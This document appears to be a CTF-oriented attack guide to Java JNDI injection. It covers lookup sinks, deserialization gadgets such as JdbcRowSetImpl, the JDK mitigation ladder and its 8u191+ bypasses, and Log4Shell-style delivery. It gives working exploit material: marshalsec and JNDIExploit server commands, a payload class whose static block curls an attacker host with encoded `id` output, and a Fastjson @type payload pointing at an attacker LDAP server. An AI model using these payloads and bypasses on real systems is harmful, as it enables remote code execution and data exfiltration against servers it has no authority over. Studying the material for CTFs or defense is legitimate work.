# JNDI Injection — the lookup path

## What the primitive is

`InitialContext.lookup(x)` resolves a *name* through JNDI providers —
LDAP, RMI, DNS, CORBA, IIOP, NDS. When `x` is attacker-controlled, the
provider fetches a remote object definition — historically a remote
`.class` file — and the server's own classloader executes it.

```java
InitialContext.lookup("ldap://attacker/a")   // LDAP provider
InitialContext.lookup("rmi://attacker/x")     // RMI registry
InitialContext.lookup("iiop://attacker/obj")  // CORBA
context.lookup(userInput)                     // any lookup() wrapper
```

## The two reachability shapes

```
direct JNDI:   app does lookup(userInput) — a URL-shaped param or header
deser→JNDI:    a gadget chain's readObject calls lookup internally —
               JdbcRowSetImpl, C3P0 PoolSource — you don't need lookup()
               in source, just the gadget class on the classpath
```

The second shape is far more common in CTF — the app looks like a plain
deserialization sink, but the chain's sink is `lookup(yourUrl)`.

## The JNDI-serving side — run a reference server

```bash
# marshalsec — serves a compiled payload class over LDAP/RMI
javac Exploit.java   # your payload — public class Exploit { static { ... } }
python3 -m http.server 8000            # host Exploit.class
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
  http://YOU:8000/#Exploit 1389
# the JNDI string: ldap://YOU:1389/Exploit
```

```bash
# JNDIExploit — batteries included: LDAP + RMI + Tomcat/Groovy bypass routes
java -jar JNDIExploit.jar -i YOUR-IP
# it prints the exact ldap:// URL to use per JDK version
```

## The payload class — what runs

```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"sh","-c",
              "curl http://YOU/`id|base64|tr -d '\n'`"});
        } catch (Exception e) {}
    }
}
```

A static block runs on classload — the constructor is never needed.

## JDK mitigation ladder — the version decides everything

| JDK | LDAP remote classload | RMI remote classload | What still works |
|---|---|---|---|
| ≤6u211/7u201/8u121 | yes | yes | straight ldap:// URL |
| 8u121–8u190 | yes | **no** (trustURLCodebase=false) | LDAP only |
| 8u191–8u242+ | **no** | **no** | local factory classes / serialized attrs |
| 11+ / 17+ | **no** | **no** | local factory classes only |

**8u191+ LDAP bypasses** — the routes that remain:

1. **`javaSerializedData`** — an LDAP entry that IS a serialized Java object:
   `lookup()` deserializes it → back to the deserialization problem, but it
   works when remote codebases are off.
2. **Tomcat local factory** — `org.apache.naming.factory.BeanFactory` +
   `ELProcessor` gadget: the LDAP entry asks for a *ResourceRef* whose
   factory is already on the classpath → EL evaluates → RCE. JNDIExploit
   serves this route as `TomcatBypass`.
3. **Groovy/GroovyShell factory** — same ResourceRef trick through
   `groovy.lang.GroovyShell` when Groovy is on the classpath.
4. **Local `ObjectFactory`** — any `javax.naming.spi.ObjectFactory`
   implementation already in the classpath that does something useful
   (`org.apache.naming.factory.BeanFactory`, `com.zaxxer.hikari`...).

## The deser→JNDI gadgets — when you don't control lookup()

| Gadget chain | JNDI call inside | Classpath need |
|---|---|---|
| `JdbcRowSetImpl` (JDK!) | `setDataSourceName`→`connect`→`lookup` | JDK only — works everywhere |
| `C3P0` | `PoolBackedDataSource`→`Referenceable`→lookup | c3p0 |
| `Rome` / `ToStringBean` | JNDI via `JndiTemplate` variant | rome |
| `HikariCP` | `HikariJNDIFactory` | hikari-cp |
| `Jackson`/Fastjson `@type` | `JdbcRowSetImpl` as the polymorphic type | jackson/fastjson |

**`JdbcRowSetImpl` is the key one** — it is `com.sun.rowset.JdbcRowSetImpl`,
a JDK class — no external library needed. Any vector that lets you set its
`dataSourceName` then trigger `getConnection`/`setAutoCommit(true)` becomes
JNDI injection.

```json
// Fastjson/Jackson polymorphic form
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://YOU/Exploit","autoCommit":true}
```

## OOB confirmation that doesn't need RCE

A `ldap://YOU/...`/`rmi://YOU/...`/`dns://x.YOU/` callback in the listener
log = the lookup ran — deserialization-or-JNDI confirmed even if the remote
codebase is dead. Then pick the 8u191+ bypass route.

## The CTF delivery channels

- A `url`/`name`/`jndi`/`lookup` param passed to `InitialContext.lookup`
- A Fastjson/Jackson body with `@type`/`@class` (auto-type)
- A gadget-chain deserialization whose sink is `JdbcRowSetImpl`
- `log4j2` `${jndi:ldap://...}` in ANY logged string (Log4Shell shape)
- An XML/soap `factory` attribute a BeanFactory resolves

## Falsifiers

- JDK ≥8u191+ AND no local factory on classpath AND no serializable
  attribute path → remote JNDI dead; go back to a local-impact chain.
- `com.sun.jndi.*.object.trustURLCodebase=false` explicitly set and
  no classpath factory → dead.
- Egress fully blocked AND the gadget has no serialized-data variant → dead.

## Output to record

- The lookup trigger (`lookup()` in source, or which gadget's internals)
- The protocol + the listener command used
- JDK version the mitigation ladder picked
- Callback/OOB or response excerpt proving the fetch or the exec
